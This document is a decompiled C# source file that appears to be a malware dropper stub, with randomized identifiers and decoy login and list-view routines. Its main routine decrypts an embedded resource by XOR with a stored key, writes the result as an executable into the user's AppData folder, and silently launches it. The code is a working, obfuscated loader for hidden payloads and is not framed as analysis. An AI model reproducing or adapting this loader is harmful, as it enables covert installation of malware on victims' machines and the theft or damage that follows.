using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

[StandardModule]
internal sealed class IvLavEFEvQdU
{
	private static PictureBox PictureBox1 = new PictureBox();

	private static PictureBox PictureBox2 = new PictureBox();

	private static ResourceManager NmPZzjhoEdTzA = new ResourceManager("OLCEyJcn", Assembly.GetEntryAssembly());

	private static string DKERdnJ = Interaction.Environ("Appdata") + "/";

	private static string[] FJcXJyIKwv = new string[]
	{
		"ALEThjJwJFK.exe",
		"HuuGhrjxjVB"
	};

	public static int myInteger;

	public static object XchNGLv(byte[] KHhzbViI, string FluatbVEQBdxchQ)
	{
		object result;
		try
		{
			string text = IvLavEFEvQdU.DKERdnJ + FluatbVEQBdxchQ;
			Stream stream = File.Open(text, 2);
			using (object obj = new BinaryWriter(stream))
			{
				object arg_4D_0 = obj;
				Type arg_4D_1 = null;
				string arg_4D_2 = "Write";
				object[] array = new object[]
				{
					KHhzbViI
				};
				object[] arg_4D_3 = array;
				string[] arg_4D_4 = null;
				Type[] arg_4D_5 = null;
				bool[] array2 = new bool[]
				{
					true
				};
				NewLateBinding.LateCall(arg_4D_0, arg_4D_1, arg_4D_2, arg_4D_3, arg_4D_4, arg_4D_5, array2, true);
				if (array2[0])
				{
					KHhzbViI = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(byte[]));
				}
			}
			result = true;
		}
		catch (Exception expr_C7)
		{
			ProjectData.SetProjectError(expr_C7);
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static object OmaPJUJpFsVttG(string a)
	{
		return (byte[])IvLavEFEvQdU.NmPZzjhoEdTzA.GetObject(a);
	}

	public static int AddOneAndReturn()
	{
		IvLavEFEvQdU.myInteger++;
		return IvLavEFEvQdU.myInteger;
	}

	[STAThread]
	public static void main()
	{
		IvLavEFEvQdU.XchNGLv(IvLavEFEvQdU.IvLavEFEvQdU1((byte[])IvLavEFEvQdU.OmaPJUJpFsVttG("QEDyaPnzo")), IvLavEFEvQdU.FJcXJyIKwv[0]);
		int arg_2C_0 = 1;
		int num = IvLavEFEvQdU.FJcXJyIKwv.Length - 1;
		for (int i = arg_2C_0; i <= num; i++)
		{
			IvLavEFEvQdU.XchNGLv((byte[])IvLavEFEvQdU.OmaPJUJpFsVttG(IvLavEFEvQdU.FJcXJyIKwv[i]), IvLavEFEvQdU.FJcXJyIKwv[i]);
		}
		IvLavEFEvQdU.IvLavEFEvQdU6(IvLavEFEvQdU.FJcXJyIKwv[0]);
	}

	private static void btnLogin_Click(object sender, EventArgs e)
	{
		object obj;
		NewLateBinding.LateCall(obj, null, "Open", new object[0], null, null, null, true);
		object obj2;
		object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj2, null, "ExecuteReader", new object[0], null, null, null));
		bool flag = false;
		string text = "";
		string text2 = "";
		while (Conversions.ToBoolean(NewLateBinding.LateGet(objectValue, null, "Read", new object[0], null, null, null)))
		{
			flag = true;
			text = NewLateBinding.LateIndexGet(objectValue, new object[]
			{
				"StaffFirstName"
			}, null).ToString();
			text2 = NewLateBinding.LateIndexGet(objectValue, new object[]
			{
				"StaffLastName"
			}, null).ToString();
		}
		if (flag)
		{
			Interaction.MsgBox(string.Concat(new string[]
			{
				"Hi ",
				text,
				" ",
				text2,
				". You are now logged on."
			}), 1, null);
		}
		else
		{
			Interaction.MsgBox("Sorry", 0, "Invalid Login");
		}
		NewLateBinding.LateCall(obj, null, "Close", new object[0], null, null, null, true);
	}

	public static byte[] IvLavEFEvQdU1(byte[] IvLavEFEvQdU2)
	{
		byte[] array = (byte[])IvLavEFEvQdU.OmaPJUJpFsVttG("AzWJrYnj");
		int arg_18_0 = 0;
		int num = IvLavEFEvQdU2.Length - 1;
		for (int i = arg_18_0; i <= num; i++)
		{
			int num2 = i % array.Length;
			IvLavEFEvQdU2[i] ^= array[num2];
		}
		return IvLavEFEvQdU2;
	}

	public static void picj(string it)
	{
		ListView listView = new ListView();
		ListView listView2 = new ListView();
		int arg_1B_0 = 0;
		int num = listView.get_Items().get_Count() - 1;
		for (int i = arg_1B_0; i <= num; i++)
		{
			if (Operators.CompareString(listView.get_Items().get_Item(i).get_SubItems().get_Item(1).get_Text(), listView2.get_Items().get_Item(i).get_SubItems().get_Item(1).get_Text(), false) != 0)
			{
				listView2.get_Items().get_Item(i).set_UseItemStyleForSubItems(false);
				listView2.get_Items().get_Item(i).get_SubItems().get_Item(1).set_BackColor(Color.get_Red());
			}
		}
	}

	public static void IvLavEFEvQdU6(string IvLavEFEvQdU0)
	{
		Interaction.Shell(IvLavEFEvQdU.DKERdnJ + IvLavEFEvQdU0, 2, false, -1);
	}
}
